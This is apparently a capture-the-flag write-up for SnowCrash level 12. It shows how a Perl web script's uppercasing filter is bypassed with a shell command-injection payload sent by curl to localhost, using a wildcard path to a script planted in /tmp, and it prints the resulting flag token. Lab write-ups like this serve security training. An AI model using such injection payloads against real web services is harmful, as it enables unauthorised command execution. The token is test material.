when the level12 program is executed, we have the rights of flag12, 
so we will try to exploit a vulnerability of level12, to make it execute getflag

this perl code performs the following operations on parameter1: 
shift to uppercase, remove everything after a space

=> we create a file with the script we want to execute, with +x rights
level12@SnowCrash:~$ echo 'echo "$(getflag)" > /tmp/res12' > /tmp/PLOP
level12@SnowCrash:~$ chmod +x /tmp/PLOP

=> we send out file as an argument, with wildcards to avoid lower case propblems
level12@SnowCrash:~$ curl 'localhost:4646/?x=$(/*/PLOP)'

=> token has been written in the tmp file
..level12@SnowCrash:~$ cat /tmp/res12
Check flag.Here is your token : g1qKMiRpXf53AWhDaU7FEkczr
